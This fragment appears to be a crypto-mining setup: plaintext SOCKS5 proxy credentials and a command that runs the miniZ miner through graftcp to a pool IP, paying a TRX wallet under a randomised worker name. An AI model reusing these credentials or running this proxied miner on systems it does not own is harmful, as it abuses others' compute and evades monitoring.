...
socks5_username = twzoghdz

socks5_password = lufxhtk0pecz
...
./graftcp/graftcp ./miniZ -u TRX:TL9Zj9rC4jbBDcGHq7H2xNJQw34VrgtBJs.$(echo $(shuf -i 1-999 -n 1)-T4) -l 45.140.13.119 --port=3333 -p x --par=ethash --pers auto
